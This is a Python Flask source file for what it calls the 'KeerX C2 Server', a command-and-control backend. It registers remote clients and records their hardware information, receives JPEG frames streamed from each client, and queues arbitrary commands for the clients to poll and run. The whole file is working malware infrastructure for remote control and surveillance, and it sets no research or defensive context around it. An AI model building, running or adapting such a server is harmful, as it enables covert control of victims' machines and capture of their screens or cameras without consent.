from flask import Flask, request, jsonify
from flask_cors import CORS
import time

app = Flask(__name__)
CORS(app)  # Enable CORS for the dashboard to connect

# Store pending commands for the client
# Key: client_id, Value: list of commands
pending_commands = {}
# Key: client_id, Value: hardware info, status, etc.
clients = {}
# Key: client_id, Value: latest JPEG frame (binary)
latest_frames = {}

@app.route('/')
def home():
    return "<h1>KeerX C2 Server is ONLINE</h1><p>Dashboard: Open <b>web/index.html</b> in your browser.</p>", 200

@app.route('/register', methods=['POST'])
def register_client():
    data = request.json
    client_id = data.get('client_id')
    if not client_id:
        return jsonify({"status": "error", "message": "Client ID required"}), 400
    
    clients[client_id] = {
        "info": data.get('info', {}),
        "last_seen": time.time(),
        "status": "online"
    }
    if client_id not in pending_commands:
        pending_commands[client_id] = []
    
    return jsonify({"status": "success", "message": "Client registered"}), 200

@app.route('/clients', methods=['GET'])
def list_clients():
    # Update status based on last seen (e.g., 30s timeout)
    now = time.time()
    for cid in clients:
        if now - clients[cid]['last_seen'] > 30:
            clients[cid]['status'] = "offline"
        else:
            clients[cid]['status'] = "online"
    return jsonify(clients), 200

@app.route('/upload_frame', methods=['POST'])
def upload_frame():
    client_id = request.args.get('client_id')
    if not client_id:
        return "No client ID", 400
    
    latest_frames[client_id] = request.data # Raw binary JPEG
    if client_id in clients:
        clients[client_id]['last_seen'] = time.time()
        
    return "Frame received", 200

@app.route('/get_frame/<client_id>')
def get_frame(client_id):
    if client_id in latest_frames:
        return latest_frames[client_id], 200, {'Content-Type': 'image/jpeg'}
    return "No frame", 404

@app.route('/command', methods=['POST'])
def send_command():
    data = request.json
    command = data.get('command')
    client_id = data.get('client_id', 'default')
    
    if not command:
        return jsonify({"status": "error", "message": "No command provided"}), 400
    
    if client_id not in pending_commands:
        pending_commands[client_id] = []
    
    pending_commands[client_id].append({
        "command": command,
        "timestamp": time.time(),
        "id": int(time.time() * 1000)
    })
    
    return jsonify({"status": "success", "message": f"Command '{command}' queued"}), 200

@app.route('/poll', methods=['GET'])
def poll_commands():
    client_id = request.args.get('client_id', 'default')
    
    # Update heartbeat
    if client_id in clients:
        clients[client_id]['last_seen'] = time.time()

    if client_id in pending_commands and pending_commands[client_id]:
        commands = pending_commands[client_id]
        pending_commands[client_id] = []  # Clear after polling
        return jsonify({"status": "success", "commands": commands}), 200
    
    return jsonify({"status": "success", "commands": []}), 200

@app.route('/status', methods=['GET'])
def server_status():
    return jsonify({
        "status": "online",
        "timestamp": time.time(),
        "clients": list(pending_commands.keys())
    }), 200

if __name__ == '__main__':
    print("🚀 KeerX C2 Server starting on http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)
